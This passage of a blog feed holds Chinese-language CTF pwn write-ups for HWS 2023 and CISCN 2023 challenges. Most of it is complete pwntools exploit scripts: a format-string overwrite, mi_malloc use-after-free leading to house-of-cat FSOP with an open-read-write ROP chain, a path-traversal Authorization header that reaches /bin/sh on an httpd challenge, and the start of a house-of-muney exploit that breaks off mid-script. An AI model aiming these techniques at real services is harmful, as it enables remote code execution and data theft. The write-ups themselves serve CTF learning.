class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xffff</span><br>    B = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><br>    C = (data &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span><br>    <span class="hljs-comment"># D = (data &gt;&gt; 48) &amp; 0xffff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br>    <br>    offset = offset + <span class="hljs-number">6</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># payload += &#x27;%&#x27; + str(cal(D, C)) + &#x27;c%&#123;&#125;$hn&#x27;.format(offset + 3)</span><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">4</span>)<br>    <span class="hljs-comment"># payload += p64(addr + 3)</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br>p.recvuntil(<span class="hljs-string">&#x27;need a str: &#x27;</span>)<br><br>payload = <span class="hljs-string">&quot;l1s00t%13$p%18$p%21$p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>code_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x13f0</span><br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span><br><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, code_base)<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>ret = stack - <span class="hljs-number">8</span><br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># dbg()</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;need other str: &#x27;</span>)<br><br>payload = myformat(<span class="hljs-number">6</span>, ret, one_gadget)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717094518373.png" alt="image-20230717094518373"></p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>题目需要patchelf路径才能正常运行。</p><p>题目的内存分配是一个新型的mi_malloc，但仍然是一道典型的菜单堆题。</p><p>题目存在UAF漏洞。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717094721967.png" alt="image-20230717094721967"></p><p>通过查看mi_malloc源码分析等博客以及调试等方式，对mi_malloc有大致的了解。感觉重要的点就是mi_malloc是以页面为单位分配内存，并把分配得到的内存再划分为不同大小的区块，每个区块互不干扰。分配小块内存时，优先从free中申请，释放时，优先放到local_free链表中。还会进行堆块的复用。</p><p>由此，可以想到，伪造local_free的next指针，即可实现任意地址分配。</p><p>大致思路就是：</p><ol><li>泄露heap地址，得到heapbase</li><li>在heap中存储heap的控制块等结构，存储有mi_libc的地址。伪造chunk块指向存储mi_libc的地址，即可泄露mi_libc地址，进而泄露libc地址</li><li>伪造_IO_2_1_stdout，劫持puts，实现ORW。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./backpwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30276</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    flag_addr = fake_IO_file_addr + <span class="hljs-number">0x200</span><br>    data = fake_IO_file_addr + <span class="hljs-number">0x400</span><br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: -<span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x10</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x1f0</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>                <span class="hljs-number">2</span>,<br>                pop_rdi_ret,<br>                flag_addr,<br>                pop_rsi_ret,<br>                <span class="hljs-number">0</span>,<br>                syscall_ret,<br><br>                pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>                <span class="hljs-number">0</span>,<br>                pop_rdi_ret,<br>                <span class="hljs-number">3</span>,<br>                pop_rsi_ret,<br>                data,<br>                pop_rdx_rbx_ret,<br>                <span class="hljs-number">0x40</span>, <span class="hljs-number">0</span>,<br>                syscall_ret,<br><br>                pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>                <span class="hljs-number">1</span>,<br>                pop_rdi_ret,<br>                <span class="hljs-number">1</span>,<br>                pop_rsi_ret,<br>                data,<br>                pop_rdx_rbx_ret,<br>                <span class="hljs-number">0x40</span>, <span class="hljs-number">0</span>,<br>                syscall_ret<br>            ]<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 2</span><br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">2</span>)<br><br>p.recvline()<br>heapbase = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; ~<span class="hljs-number">0xffffff</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br>edit(<span class="hljs-number">2</span>, p64(heapbase + <span class="hljs-number">0x240</span>))<br><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 4</span><br><br>show(<span class="hljs-number">4</span>)<br><br>mi_libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x22861</span><br>lg(<span class="hljs-string">&#x27;mi_libc_base&#x27;</span>, mi_libc_base)<br><br>libc_base = mi_libc_base - <span class="hljs-number">0x1f2000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>_IO_2_1_stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1ee7e0</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e8f60</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x000000000015f8c6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>deferred_free = mi_libc_base + <span class="hljs-number">0x75f50</span><br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 7</span><br><br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># edit(7, p64(deferred_free))</span><br>edit(<span class="hljs-number">7</span>, p64(_IO_2_1_stdout))<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 9</span><br><br><span class="hljs-comment"># dbg()</span><br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + house_of_cat(_IO_2_1_stdout)<br>add(<span class="hljs-number">0x400</span>, payload)  <span class="hljs-comment"># 10</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717101150817.png" alt="image-20230717101150817"></p><h2 id="mhttpd"><a href="#mhttpd" class="headerlink" title="mhttpd"></a>mhttpd</h2><p>题目修改自于Tinyhttpd这个项目。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717104013884.png" alt="image-20230717104013884"></p><p><img src="/img/2023-HWS-PWN-WP/image-20230717103334947.png" alt="image-20230717103334947"></p><p>题目未限制v18的长度，导致base64解密后可以覆盖url，从而绕过路径穿越检测，达到任意文件执行的效果。</p><p>使用cyberspace生成需要的base64串。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717104430071.png" alt="image-20230717104430071"></p><p><img src="/img/2023-HWS-PWN-WP/image-20230717101625993.png" alt="image-20230717101625993"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>, <span class="hljs-number">30295</span>)<br><br>data = <span class="hljs-string">&quot;GET /l1s00t.html HTTP/1.1\r\nAuthorization: Basic QWRtaW46YWFhYWJhYWFjYWFhZGFhYWVhYWFmYWFhZ2FhYWhhYWFpYWFhamFhYWthYWFsYWFhbWFhYW5hYWFvYS8uLi8uLi8uLi8uLi8uLi8uLi8uLi9iaW4vc2g/Lmh0bWw=\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\r\n&quot;</span><br><br>p.sendline(data)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717152846297.png" alt="image-20230717152846297"></p><p>参考文章：</p><p><a href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p><p><a href="https://www.cnblogs.com/linkwk7/p/11193728.html">https://www.cnblogs.com/linkwk7/p/11193728.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/p/12169392.html">https://www.cnblogs.com/Five100Miles/p/12169392.html</a></p><p><a href="https://github.com/EZLippi/Tinyhttpd">https://github.com/EZLippi/Tinyhttpd</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-ciscn-华中赛区-pwn-wp</title>
    <link href="/2023/07/08/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/"/>
    <url>/2023/07/08/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-ciscn-华中赛区-pwn-wp"><a href="#2023-ciscn-华中赛区-pwn-wp" class="headerlink" title="2023-ciscn-华中赛区-pwn-wp"></a>2023-ciscn-华中赛区-pwn-wp</h1><h2 id="muney"><a href="#muney" class="headerlink" title="muney"></a>muney</h2><p>检查保护</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708134910776.png" alt="image-20230708134910776"></p><p>没开PIE，且got表可写。</p><p>程序首先对我们输入的内容进行进行解析，接下来就是常规的菜单堆题了。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135001560.png" alt="image-20230708135001560"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135131257.png" alt="image-20230708135131257"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135221417.png" alt="image-20230708135221417"></p><p>至于解析格式，从题目输出<strong>HTTP_Parser&gt;</strong> 可知，应该对http参数进行解析。这里，我们随便抓一个包，获取http请求参数，然后结合动态调试就可以得到输入格式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>content = <span class="hljs-number">0x80</span> * <span class="hljs-string">&#x27;a&#x27;</span><br>payload = header + content<br></code></pre></td></tr></table></figure><p>接下来，我们分析菜单功能。这里我们主要关注<strong>add</strong> 、<strong>edit</strong> 与 <strong>quit</strong> 这三个函数。</p><p>add函数通过解析http头获取size。比较恶心的一点是size必须&gt;0xfffff，也就是使用<strong>mmap</strong>分配堆块。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135931053.png" alt="image-20230708135931053"></p><p>edit函数并没有检查ofsize的正负性，存在负数溢出，一次最多可以写8个字节。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708140130826.png" alt="image-20230708140130826"></p><p>quit函数<strong>exit</strong>第一个参数是”&#x2F;bin&#x2F;sh” 。这里不难想到修改<strong>exit</strong>的got表为<strong>system</strong>。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708140310833.png" alt="image-20230708140310833"></p><p>这道题的难点在于使用<strong>mmap</strong>分配堆块，比赛时也是想了很久，也没想出来。这道题最终只有1解，是华科的师傅们解出来的。太厉害了。</p><p>这道题的利用方法是<strong>house of muney</strong>，之前都没听过。这次也算是长了见识。</p><ol><li>使用mmap偷取libc内存，把不可写的部分变为可写。</li><li>伪造<strong>bitmask_word</strong>、<strong>bucket</strong>、<strong>hasharr</strong>与<strong>exit_sym</strong>的<strong>st_value</strong>字段</li><li>动态解析执行system。</li></ol><p>这里主要说说如何获取bitmask_word这些关键字段。</p><p>这里，我们需要跟踪exit函数的动态解析过程。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141728423.png" alt="image-20230708141728423"></p><p>以下是exit动态解析大致调用链。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141820302.png" alt="image-20230708141820302"></p><p>这里的关键就是<strong>do_lookup_x</strong>函数，我们需要的关键字段都是在这个函数获取的。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141951293.png" alt="image-20230708141951293"></p><p>同理，继续向下跟踪就可以获取剩下的参数。</p><p>需要注意的是，我们跟踪的是第二次解析过程，也就是i&#x3D;1时的字段内容。</p><p>最终脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, p16, p8<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./muney&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span 